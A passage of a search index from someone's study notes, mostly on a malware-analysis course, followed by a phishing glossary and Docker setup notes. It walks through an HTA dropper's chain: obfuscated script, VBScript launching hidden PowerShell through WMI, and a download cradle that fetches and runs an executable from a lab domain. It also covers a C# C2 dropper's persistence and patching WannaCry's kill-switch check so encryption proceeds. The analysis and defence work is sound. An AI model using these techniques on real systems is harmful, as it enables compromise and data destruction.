Summary"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#introduction","title":"Introduction","text":"<p>On the subject of scripted malware delivery mechanisms, let\u2019s examine a curious class of malware called the HTML Application (HTA) file. HTAs are commonly used as the payload of phishing attacks. By the end of this section, you\u2019ll see why this is the case.</p> <p>Extract the sample and let\u2019s get going!</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#the-offensive-potential-of-html","title":"The Offensive Potential of HTML","text":"<p>It is no secret that HTML can be weaponized. Every time you visit a website, your web browser downloads and renders the code that is served out by that website. Your browser is really just an interpreter for the technologies that power the web: HTML, CSS, and JavaScript.</p> <p>HTML provides the structure of the website. CSS applies color, fonts, presentation, and layouts of the website. And JavaScript can dynamically control behavior of elements of the website.</p> <p>It\u2019s that last one that we need to watch out for.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#javascript-is-dangerous","title":"JavaScript Is Dangerous","text":"<p>You may be familiar with the classic Cross-Site Scripting test that pops an alert box by injecting the <code>&lt;script&gt;</code> block into an HTML page. If you\u2019ve seen this test before, you may have wondered \u201cwhat is actually going on when this happens?\u201d</p> <p></p> <p>HTML pages can define the <code>&lt;script&gt;</code> tag to include code that can run different scripting languages. In most cases, the language is JavaScript. JavaScript can execute code within the browser to move components around on the page, change colors and fonts, pop that alert box, and do many other functions. Think of JavaScript as the programmatic engine of HTML.</p> <p>The W3 Schools demo for JavaScript\u2019s alert() box method demonstrates this well.</p> <p>Try saving this code to <code>index.html</code> and running it locally by opening it in a web browser</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n\n&lt;h1&gt;The Window Object&lt;/h1&gt;\n&lt;h2&gt;The alert() Method&lt;/h2&gt;\n\n&lt;p&gt;Click the button to display an alert box.&lt;/p&gt;\n\n&lt;button onclick=\"myFunction()\"&gt;Try it&lt;/button&gt;\n\n&lt;script&gt;\nfunction myFunction() {\nalert(\"Hello! I am an alert box!\");\n}\n&lt;/script&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>The takeaway here is that JavaScript executes code within the browser. But when JavaScript executes within a web browser, the code execution is confined to the web browser itself. That is to say, the code runs in the context of the browser, manipulates the document model of the web page, and can manipulate cookies, but can\u2019t reach the operating system of the host unless there is some kind of browser based code execution vulnerability.</p> <p>When used in an offensive capacity, JavaScript can perform activities like hooking the client\u2019s browser (see the BeEF Framework for an example of this) and downloading files via HTML Smuggling. The offensive potential of JavaScript is apparent, but if it\u2019s usually limited to the browser of the victim, then that doesn\u2019t sound so bad, right?</p> <p>Wrong!</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#enter-html-applications","title":"Enter, HTML Applications","text":"<p>Imagine that a developer needs to design a compact, portable HTML site that can be easily sent to anyone who needs it. Maybe it\u2019s a company survey. Maybe it\u2019s a presentation of some sort. The developer can create an HTML Application (HTA) file for this purpose.</p> <p>HTAs are Windows-executable, packaged HTML files that run HTML, CSS, and Windows native scripting languages from a single file outside of the context of the web browser. The last part of that sentence is the really scary thing here: HTAs do not run in the context of the Windows web browser, but instead run as a trusted application on the operating system.</p> <p>An HTML Application is not much different from a normal HTML page in terms of construction. In fact, you can use the exact same code from an HTML page to make an HTA.</p> <p>Try it out yourself \u2014 take the W3 Schools code for the JavaScript alert() method that we just used, open a new text file, write that HTML code into the file, and save it as <code>test.hta</code> on your FLARE-VM host. Then, double click on the file</p> <p></p> <p>The window that spawns is a self contained Windows application that renders and runs the HTML, CSS, and/or scripting code that is packaged inside of it. If we click on the Try it button, we see that this application can execute the embedded JavaScript code</p> <p></p> <p>The scripting languages we can use here are not limited to JavaScript (or JScript in the context of Windows). We can embed any Windows-native scripting language inside of an HTA and it will execute the provided code. This includes JavaScript/JScript, VBScript, and both together in the same file.</p> <p>In the previous section, we saw how VBScript can be weaponized. So the thought of a self contained HTML application that can execute code dynamically and have it run on the operating system of the victim should spark our concern.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#analyzing-htas","title":"Analyzing HTAs","text":"<p>Let\u2019s examine a weaponized HTA and unravel its functionality to demonstrate how to analyze these files.</p> <p>The sample archive is called <code>Dropper.hta.malz</code>. Let\u2019s rename this to <code>Dropper.hta</code>. When we do this, notice that Windows changes the file icon to an application icon</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#static-analysis","title":"Static Analysis","text":"<p>Recall that an HTA is still, under the hood, HTML in a single file. Let\u2019s open this file in Visual Studio Code to examine the HTML located within it:</p> <pre><code>&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;&lt;/title&gt;\n&lt;body&gt;\n&lt;script language=\"JavaScript\" type=\"text/javascript\"&gt;\ndocument.write(unescape('%3c%68%74%6d%6c....[snip]......'));\n&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Take note of the contents of this file. The actual HTML of the application is barren but has one notable feature. The <code>&lt;script&gt;</code> tag wraps a call to the JavaScript <code>document.write()</code> method. This call to <code>document.write()</code> has a block of characters that are delimited by percent signs inside of the <code>unescape()</code> method. Let\u2019s examine both methods to identify what they do:</p> <pre><code>- `document.write()`: The `write()` method writes directly to an open (HTML) document stream.\n- `unescape()`: The `unescape()` function computes a new string in which hexadecimal escape sequences are replaced with the characters that they represent.\n</code></pre> <p>Immediately, we have an idea of what\u2019s going on here:</p> <pre><code>- The block of characters inside the `unescape()` method is a bunch of hexadecimal bytes that are interpreted and replaced by the character that they represent.\n- Then, the interpreted characters are written to the document of the page.\n</code></pre> <p>We can decode the block of hex characters in CyberChef by using the <code>From Hex</code> item and delimiting by percent sign. FLARE-VM installs a local instance of CyberChef in the <code>C:\\Tools\\cyberchef directory</code>. An online instance of CyberChef is also running at the following link CyberChef</p> <p>Using CyberChef, we add the <code>From Hex</code> decoder and change the delimiter to <code>Percent</code>. Then, we copy the block of hex bytes into the Input section:</p> <p></p> <p>The Output section now contains the following</p> <p></p> <p>Several things are concerning about this!</p> <p>When the HTA is executed, it decodes and writes this HTML to the page. This block of HTML contains another script block that invokes VBScript to run code. But what does the code do?</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#invoking-wmi-executing-powershell","title":"Invoking WMI &amp; Executing PowerShell","text":"<p>The VBScript code starts by setting up the required parameters to invoke Windows Management Instrumentation (WMI) to execute a process. WMI is a part of the Windows operating system that acts as an interface for management purposes. It is extremely powerful and complicated and most of its functionality is outside the scope of this course, but it can do a few things that make it relevant for malware analysis.</p> <p>WMI can start and run processes through the Win32_Process namespace. Effectively, this means that anything that can access WMI can execute a process.</p> <p>In our sample, the VBScript code is setting WMI up to be able to execute a process</p> <p></p> <p>The VBScript then performs the following</p> <p></p> <p>This line executes a process through the WMI service and returns the results to the <code>Error</code> variable.</p> <p>The process argument here runs a command shell which, in turn, runs PowerShell in a hidden window. When PowerShell is executed, it performs the following</p> <p></p> <p>The VBScript then calls <code>window.close()</code> to close out of the HTA window.</p> <p>If we take a step back, we now have a clear idea of the execution chain here:</p> <pre><code>- HTA is opened and runs the embedded JavaScript.\n- The JavaScript decodes the hex bytes of an inner HTML document and writes it into the HTA.\n- The inner HTML document invokes VBScript to execute WMI.\n- WMI runs a process to call a command shell.\n- The command shell, in turn, runs PowerShell in a hidden window.\n- PowerShell runs a download cradle command to reach out to `http://tailofawhale.local/TellAndSentFor.exe`, write it to the %temp% directory as jLoader.exe and then execute `jLoader.exe`.\n</code></pre> <p>With a good understanding of the payload, let\u2019s move onto dynamic analysis to see it in action!</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>When we open the HTA program, a window flashes for a moment and then disappears. If we are running INetSim at the time of detonation, we see the default INetSim binary spawn. Take note of the location where the binary is running from</p> <p></p> <p>Dropper.hta has clearly succeeded in downloading and executing something. Let\u2019s examine the network signatures.</p> <p>In Wireshark, we see the outbound DNS request for <code>tailofawhale.local</code> and its DNS resolution</p> <p></p> <p>We can also see the HTTP request to the malicious domain and response in Wireshark</p> <p></p> <p>If we go to examine host-based indicators, we run into a small snag. There is no process called \u201cDropper.hta\u201d anywhere in the list of running processes on the host. Where does this process execute?</p> <p>HTAs do not execute directly. When double-clicked, they are passed to the native Windows binary <code>mshta.exe</code> which executes them on its behalf. <code>mshta.exe</code> acts as an HTML interpreter and loads the HTML from the HTA along with any DLLs that deal with script execution and then executes the program all at once.</p> <p>If we look in the Procmon process tree after detonation, we see an invocation of <code>mshta.exe</code> that takes the path to our HTA sample as its argument</p> <p></p> <p></p> <p>We\u2019ve accounted for the execution of the HTA, but we haven\u2019t accounted for the other parts of the payload yet. Where is the call to PowerShell and the command shell?</p> <p>Higher up in the process list, there is an instance of svchost.exe that is executing a process called wmiprvse.exe. This is the way that Windows invokes WMI to execute processes</p> <p></p> <p>We can follow the <code>wmiprvse.exe</code> process all the way down through the call to PowerShell and, eventually, the execution of the <code>jLoader.exe</code> program. In this case, this was our INetSim default binary that spawned the message box, but in real life this is likely a second stage payload.</p> <p>After annotating these details, we have effectively analyzed the HTA dropper sample.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#summary","title":"Summary","text":"<p>This section covered the analysis methodology of the HTA, a curious little file format that wraps all of the functionality of HTML into a single file and executes it directly on the Windows OS. It also covered a bit about how WMI can execute processes.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#reversing-c-malware","title":"Reversing C# Malware","text":"Reversing C# &amp; the .NET Framework Reversing an Encrypted C2 Dropper"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#intro-to-reversing-c-the-net-framework","title":"Intro to Reversing C# &amp; the .NET Framework","text":"<p>Lab File(s)</p> <p>Floss the sample &gt; we see mscorlib so it's C#, also another clue is the .NETFramework version</p> <p>How Does C# Code Get Compiled and Executed?</p> <p></p> <ul> <li>Compiling C# Code</li> <li>Once the code is written, it needs to be compiled into MSIL code using the C# compiler.</li> <li>This creates an assembly that contains the compiled code and any metadata that describes the code.</li> <li>Loading the Assembly</li> <li>The assembly is loaded into the CLR, which loads the code into memory and performs a number of checks to ensure that the code is safe to execute.</li> <li>This includes verifying that the code has not been tampered with and that it is signed with a valid digital signature.</li> <li>JIT Compilation</li> <li>The MSIL code is then compiled by the Just-In-Time (JIT) compiler into native machine code that can be executed on the computer\u2019s processor.</li> <li>This code is generated dynamically at runtime and is optimized for the specific hardware and operating system on which it is running.</li> <li>Execution</li> <li>The native machine code can now be executed by the computer\u2019s processor, which runs the C# application.</li> <li>During execution, the CLR manages the memory and resources used by the application, including performing garbage collection to free up memory that is no longer being used.</li> </ul> <p>Language C# C# Compiler translate language to IL &gt; so compiles into an Assembly such as .exe IL (Intermediate Language) Creation CLR (Common Language Runtime) This is how a C# program is execution OS</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#reversing-an-encrypted-c2-dropper-dll-with-dnspy","title":"Reversing an Encrypted C2 Dropper DLL with dnSpy","text":"<p>Lab File(s)</p> <p>Errata Note: dnSpy is available at the following GitHub repository</p> <p>Note The tool I use at the 12:15 mark is Fakenet-NG, which is a built-in network simulator on FLARE-VM. It is basically the same as INetSim, but runs on the FLARE-VM host instead of on REMnux. I left it out of the course because it tends to be very buggy and mess up the networking stack on the FLARE-VM host, but it helps to set up a quick network simulator on FLARE-VM.</p> <p>The important part is that it catches the callback domain name for this C2 dropper, which can also be identified with INetSim.</p> <p>load the sample into dnSpy</p> <p></p> <p>dnSpy will reassemble the binary code. In this sample it seems when the program was compiled it was named <code>EmbedDLL</code></p> <p></p> <p>This program loads up a base64 into memory which it will decrypt with provided password, it will also end up with creating a registry file</p> <p></p> <p>How to run dlls?</p> <p>In order to run a dll you need to know the functions it has defined so you can call the dll and its function, in this case the function is called <code>embed</code></p> <p></p> <pre><code>rundll32 &lt;sample_dll&gt;,&lt;function&gt;\n</code></pre> <p></p> <p>If we check the location of the files as stated in the code we will see them</p> <p></p> <p></p> <p>Check registry as well</p> <p></p> <p>So the registry is calling to the VBS script which is calling the xml script, it's runs when someone logs in</p> <p></p> <p>Checking the XML</p> <p></p> <p>Seems to be using an Evasion Technique by loading Reflection Assembly</p> <p></p> <p>If we run the VBScript we will see the DNS call in <code>fakenet.exe</code></p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#analyzing-go-malware","title":"Analyzing Go Malware","text":"Programming Language"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#programming-language-recognition-analyzing-a-go-service-backdoor","title":"Programming Language Recognition &amp; Analyzing a Go Service Backdoor","text":"<p>Lab File(s)</p> <p>References</p> <ul> <li>Unit42 The Gopher</li> <li>Merlin C2 Agent written in Go</li> </ul> <p>Notice that the binary size for <code>Go</code> is huge, almost 7MB for about 20 lines of code</p> <p></p> <p>floss the sample</p> <p></p> <p></p> <p>We can also try something like this</p> <p></p> <p>References for golang</p> <p></p> <p></p> <p>.symtab showed up when loading the sample into PEbear</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#mobile-malware-analysis","title":"Mobile Malware Analysis","text":"Lab Update: Installing MobSF MobSF"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#lab-update-installing-mobsf","title":"Lab Update: Installing MobSF","text":"<p>MobSF Docker Install Instructions</p> <p>In order for us to install the tool we need, we need to change the Network to NAT on the Remnux vm then reboot the vm.</p> <p>Installing MobSF on docker, we won't be able to do Dynamic Analysis but we can do Static Analysis</p> <pre><code>docker pull opensecurity/mobile-security-framework-mobsf\ndocker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest\n</code></pre> <p>Now after install is completed, we need to switch back the Network adapter on the vm to <code>Host-only Adapter</code> then reboot the vm.</p> <p>execute this</p> <pre><code>docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest\n</code></pre> <p></p> <p>You should be able to use it now.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#intro-to-mobsf","title":"Intro to MobSF","text":"<p>Lab File(s)</p> <p>Update 11/13/21: A few weeks after the release of this course, Aaron Wilson released the Mobile Application Penetration Testing course here at TCM Academy. While this part of the course scratches the surface of reverse engineering Android applications, Aaron's course is a full, in-depth look at mobile application pentester methodology. The skill overlap between RE and pentesting mobile applications is significant, so check his course out if you're hungry for more mobile app security!</p> <p>(Aaron's affiliate link is used in the hyperlink above for full disclosure. I make nothing off the purchase of the course, I'm simply a big fan of what he's put together!)</p> <p></p> <p>Rename the sample to APK then upload it</p> <p></p> <p>We can see the Java source code</p> <p></p> <p></p> <p></p> <p></p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#analyzing-real-world-malware-samples","title":"Analyzing Real-World Malware Samples","text":"WannaCry.exe"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#wannacryexe-introduction-walkthrough","title":"WannaCry.exe Introduction &amp; Walkthrough","text":"<p>Lab File(s)</p> <p>GhidraNinja: Reversing Wannacry Part 1</p> floss <p></p> <p>We see the DOS message multiple times which could indicate multiple excutables, multiple stages. We also see a lot of API calls</p> <p></p> <p></p> <p></p> <p></p> PEStudio <p> </p> <p></p> <p></p> INetSim <p>So if we have INetSim running and trying to get a packet capture going we will see that the url is gets a <code>200 ok</code>, it will stop executing the malware.</p> <p>So for our case we will need to have INetSim (disabled/not running) and we can use some of the other local tools</p> TCPView <p>We will see the APIPA address being called, which isn't really pointing anywhere. APIPA [Automatic Private IP Addressing] range is [169.254.0.0 TO 169.254.255.255].</p> <p>The port it's trying however is the SMB port of 445. ALso it's seems to be trying different IPs on the Network to spread itself (has worm capabilities)</p> <p></p> <p>Attempting to open a listener on port <code>9050</code></p> <p></p> Procmon <p>Host indicators</p> <p>setup thefilters</p> <p></p> <p>Run the binary as admin and see what happens</p> <p></p> <p>We find some task scheduler activities going on</p> <p></p> <p>Process tree </p> <p></p> <p>So we know the parent PID is <code>3336</code>, we can filter on that as Parent PID</p> <p></p> <p>We see the beginning of the exection of second stage</p> <p></p> <p>Filter for <code>Operation</code> <code>CreateFile</code></p> <p></p> <p>We see that it's creating a directory in <code>c:\\ProgramData\\</code></p> <p></p> <p>The staging area</p> <p></p> <p>We see a service created with the same name as the weird folder name. So this will be the service that will re-encrypt everything once you restart your computer</p> <p></p> Cutter <p></p> <p></p> <p></p> Debugger x32dbg <p>Search for string reference the url</p> <p></p> <p>We want to set a breakpoint at that address location (F2)</p> <p></p> <p>Hit F9 until you see the URL</p> <p></p> <p>We keep stepping over and we see the next call</p> <p></p> <p>We check the <code>test edi, edi</code>, this is teh result of the <code>InternetOpenUrl</code> Call. We see that the EDI value isn't cleared out, it's <code>00CC000C</code>.</p> <p>If we hit <code>F8</code> we will see the test result shown in next figure</p> <p></p> <p>So the test result reflected in <code>ZF</code> is <code>0</code>, which means the flag was cleared due to API call <code>InternetOpenUrl</code> returning a result</p> <p></p> <p>So now the <code>jne</code> will evaluate the <code>ZF</code> result. If the <code>ZF</code> flag is set to <code>0</code> take the jump to exit the program, if not then continue to the next Call.</p> <p>This is the kill switch that stops the Malware from running.</p> <p></p> <p>So if we change the <code>ZF</code> value to '1', the program will not jump and will insteadcontinue to the next API Call</p> <p></p> <p>Now we will see that the call was made and the Malware started doing it's file Encryption magic</p> <p></p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#automation-sandboxes-pipelines","title":"Automation: Sandboxes &amp; Pipelines","text":"BlueJupyter"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#bluejupyter-automating-triage-with-jupyter-notebooks","title":"BlueJupyter: Automating Triage with Jupyter Notebooks","text":"<p>Lab File(s)</p> <p>Note For this section of the course, I am working on my Linux development workstation. This is outside of my lab environment. I confirmed that Blue-Jupyter functions as intended if you install it on REMnux, so feel free to carefully add REMnux back onto a NAT adapter and follow the install instructions for Blue-Jupyter. <p>Update 2/18/22: Dockerized Blue-Jupyter Installation Instructions</p> <p>I have Dockerized the Blue-Jupyter application to cut down on the number of poetry and pip errors that were plaguing the code! Please follow these instructions to install and run the Dockerized version of the app. Note that these instructions are different than what you see in the video:</p> <p>Clone the PMAT-lab branch of the code repository and change directories into it:</p> <pre><code>remnux@remnux:~$ git clone --branch PMAT-lab https://github.com/HuskyHacks/blue-jupyter.git &amp;&amp; cd blue-jupyter\n</code></pre> <p>Run the following Docker build command:</p> <pre><code>remnux@remnux:~/blue-jupyter$ sudo docker build -t bluejupyter .\n</code></pre> <p>When the image is finished building, run the following command to launch the notebook with a published port of 8888 and a mounted volume to the dropbox directory:</p> <pre><code>remnux@remnux:~/blue-jupyter$ sudo docker run -it -p 8888:8888 -v /home/remnux/blue-jupyter:/src bluejupyter\n</code></pre> <p>Now, if you want to add malware to the dropbox, copy it from the PMAT-labs repository into the <code>/home/remnux/blue-jupyter/malware-analysis/dropbox/</code> directory and it will also copy into the container.</p> <p>You can then proceed to follow the instructions from the video.</p> <p>Please note that you need to be connected to the internet and must use a valid VirusTotal API key to get the API results. VirusTotal Public API keys are free and you can sign up for one here VirusTotal API Key Signup</p> <p>Once you are done, make sure to remove REMnux from the NAT adapter and double-check that it is back in the isolated lab environment.</p> <p>References:</p> <ul> <li>Taggart Tech Youtube Channel</li> <li>Taggart Tech Twitch</li> <li>@MalwareUnicorn</li> <li>Referenced ShellCon talk</li> <li>Linux Dev Workstation</li> </ul> Any.Run ChatGPT Script Analysis Mindmaps Extras"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#anyrun-malware-sandboxing","title":"Any.Run: Malware Sandboxing","text":"<p>Update 11/8/22</p> <p>It appears that ANY.RUN now requires you to provide a business email to sign up for an account.</p> <p>I will not fault anyone for not wanting to provide a business email for this purpose. Feel free to skip the practical portion of this section and simply watch the video. Alternatively, another sandbox site called Hatching Triage offers free personal use accounts and does not require a business email. I love Triage and use them for my personal and professional research and recommend their services for this purpose. Please note that their account creation process does take some time due to their verification process. </p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#advanced-script-analysis-with-chatgpt","title":"Advanced Script Analysis with ChatGPT","text":"<p>Lab File(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#rule-writing-report-publishing","title":"Rule Writing &amp; Report Publishing","text":"YARA Rules Detection with YARA Writing &amp; Publishing Analysis Report"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#writing-yara-rules","title":"Writing YARA Rules","text":"<p>Lab File(s)</p> <p>Resources - YARA Documentation - VirusTotal/yara - InQuest/awesome-yara</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#detecting-malware-with-yara","title":"Detecting Malware with YARA","text":"<p>Lab File(s)</p> <p>Errata YARA is now invoked with the command <code>yara64</code> in the newer version of FLARE-VM. If you can't run YARA by running <code>yara32</code>, try <code>yara64</code> instead!</p> <p><code>-w</code> supress any errors <code>-p 32</code> number of threads threads <code>-s' print the matching strings defined in the template</code>-r` recurse directory</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#writing-publishing-a-malware-analysis-report","title":"Writing &amp; Publishing a Malware Analysis Report","text":"<p>Report Template</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#mindmaps","title":"mindmaps","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#additional-resources","title":"Additional resources","text":"<ul> <li>SANS Malware Analysis and Reverse-Engineering Cheat Sheet click to open PDF in new tab</li> <li>fareedfauzi</li> <li>Malware Analysis - Exploit Notes</li> <li>Malware Static Analysis</li> <li>Reverse Engineering / Binary Exploitation Cheat Sheet</li> <li>Cheatsheet: Windows Malware Analysis and Reversing</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/THM_TryHackMe/Cyber_Security_Awareness/","title":"Cyber Security Awareness","text":"<p>Common Attacks</p> <p>Phishing is a sub-section of social engineering.</p> Attack Type Definition General Phishing mass phishing attack which doesn't target anyone in particular, although they may aim for large groups (e.g. PayPal users, or Amazon customers). These large-scale campaigns are usually simple and are generally (but not always) fairly easy to spot. Spearphishing spearphishing aims for an individual or small group (e.g. employees of a specific company). Spearphishing campaigns are generally better crafted. Whaling whaling targets high-value individuals (e.g. a C-Suite executive in a target company). The messages are generally extremely well crafted and tend to be very hard to spot."},{"location":"Knowledge_Base/Home_Lab/Docker/","title":"Docker","text":"<p>docker official ubuntu</p>"},{"location":"Knowledge_Base/Home_Lab/Docker/#resources","title":"Resource(s)","text":"<ul> <li>official docker CLI reference</li> <li>Official docker cheat sheet</li> <li>docker manuals</li> <li>docker hub</li> <li>docker-OSX</li> </ul>"},{"location":"Knowledge_Base/Home_Lab/Docker/#installation","title":"Installation","text":""},{"location":"Knowledge_Base/Home_Lab/Docker/#set-up-dockers-apt-repository","title":"Set up Docker's apt repository","text":"<p>Add Docker's official GPG key</p> <pre><code>sudo apt-get update\nsudo apt-get install ca-certificates curl\nsudo install -m 0755 -d /etc/apt/keyrings\nsudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc\nsudo chmod a+r /etc/apt/keyrings/docker.asc\n</code></pre> <p>Add the repository to Apt sources:</p> <pre><code>echo \\\n\"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \\\n$(. /etc/os-release &amp;&amp; echo \"$VERSION_CODENAME\") stable\" | \\\nsudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null\nsudo apt-get update\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Docker/#install-the-docker-packages","title":"Install the Docker packages","text":"<pre><code>sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Docker/#verify-the-installation","title":"Verify the Installation","text":"<p>Verify that the Docker Engine installation is successful by running the hello-world image</p> <pre><code>sudo docker run hello-world\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Docker/#create-the-docker-group","title":"Create the docker group","text":"<pre><code>sudo groupadd docker\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Docker/#add-your-user-to-the-docker-group","title":"Add your user to the docker group","text":"<p>The docker group grants root-level privileges to the user. For details on how this impacts security in your system, see Docker Daemon Attack Surface.</p> <pre><code>sudo usermod -aG docker $USER\n</code></pre> <p>Log out and log back in so that your group membership is re-evaluated</p>"},{"location":"Knowledge_Base/Home_Lab/Docker/#activate-the-changes-to-groups","title":"activate the changes to groups","text":"<pre><code>newgrp docker\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Docker/#verify-that-you-can-run-docker-commands-without-sudo","title":"Verify that you can run docker commands without sudo","text":"<pre><code>docker run hello-world\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Docker/#boot-startup","title":"boot startup","text":""},{"location":"Knowledge_Base/Home_Lab/Docker/#to-enable-docker-start-on-boot","title":"To enable Docker start on boot","text":"<pre><code>sudo systemctl enable docker.service\nsudo systemctl enable containerd.service\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Docker/#to-disable-docker-start-on-boot","title":"To disable Docker start on boot","text":"<pre><code>sudo systemctl disable docker.service\nsudo systemctl disable containerd.service\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Docker/#run-the-docker-daemon-as-a-non-root-user-rootless-mode","title":"Run the Docker daemon as a non-root user (Rootless mode)","text":""},{"location":"Knowledge_Base/Home_Lab/Docker/#docker-compose-plugin","title":"Docker compose plugin","text":""},{"location":"Knowledge_Base/Home_Lab/Docker/#installupdate-the-plugin-only","title":"Install/Update the plugin only","text":"<pre><code>sudo apt-get update\nsudo apt-get install docker-compose-plugin\n</code></pre> <p>Check the version</p> <pre><code>docker compose version\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Docker/#cheatsheet","title":"cheatsheet","text":""},{"location":"Knowledge_Base/Home_Lab/Docker/#basic-commands","title":"Basic commands","text":"command description <code>docker</code> To check all available Docker Commands <code>docker version</code> To show Docker version <code>docker info</code> Displays system wide information <code>docker pull</code> To pull the docker Images from Docker Hub Repository <code>docker build</code> To Docker Image from Dockerfile <code>docker run</code> Run a container from a docker <code>docker commit</code> To commit a changes in container file OR create newdocker Image <code>docker ps</code> List all the running containers. Add the flag to list all the containers. <code>docker start</code> To start a docker container <code>docker stop</code> To stop a docker container <code>docker logs</code> To view Logs for a Docker Container <code>docker rename</code> To rename Docker Container <code>docker rm</code> To remove the Docker Container, stop it first"},{"location":"Knowledge_Base/Home_Lab/Docker/#lifecycle-commands","title":"Lifecycle commands","text":"command description <code>docker create</code> Create a new container <code>docker run</code> Creates a docker container from docker image <code>docker pause</code> To pause a running container <code>docker unpause</code> To unpause a running container <code>docker stop</code> To stop a docker container <code>docker start</code> To start a docker container <code>docker Restart</code> To restart docker container <code>docker attach</code> Attach Terminal to Running container <code>docker wait</code> Block until one or more containers stop, then print their exit codes <code>docker rm</code> To remove the Docker Container, stop it first and then remove it <code>docker kill</code> To stop and remove Docker containers"},{"location":"Knowledge_Base/Home_Lab/Docker/#image-commands","title":"Image commands","text":"command description <code>docker build</code> To build Docker Image from Dockerfile <code>docker pull</code> To pull Docker Image from Docker Hub Registry <code>docker tag</code> To add Tag to Docker Image <code>docker images</code> To list Docker Images <code>docker push</code> To push Docker Images to <code>docker create</code> To show history of Docker Image <code>docker inspect</code> To show complete information in JSON format <code>docker save</code> To save an existing Docker Image <code>docker import</code> Create Docker Image from Tarball <code>docker export</code> To export existing Docker <code>docker load</code> To load Docker Image from file or archives <code>docker rmi</code> To remove docker images"},{"location":"Knowledge_Base/Home_Lab/Docker/#compose-commands","title":"Compose commands","text":"command description <code>docker-compose build</code> To build docker compose file <code>docker-compose up</code> To run docker compose file - Create and start containers <code>docker-compose start</code> To start containers which are already created using docker compose file <code>docker docker-compose run</code> To run one one of application inside <code>docker-compose rm</code> To remove docker containers from docker compose <code>docker-compose ps</code> To check docker container status from docker compose"},{"location":"Knowledge_Base/Home_Lab/Docker/#networking-commands","title":"Networking commands","text":"command description <code>docker network create</code> To create docker network <code>docker network ls</code> To list docker networks <code>docker network inspect</code> To view network configuration details"},{"location":"Knowledge_Base/Home_Lab/Docker/#prune-commands","title":"Prune commands","text":"command description <code>docker system prune</code> To clean all resources which are dangling or not associated with any docker container <code>docker image prune</code> To remove Dangling Docker images <code>docker 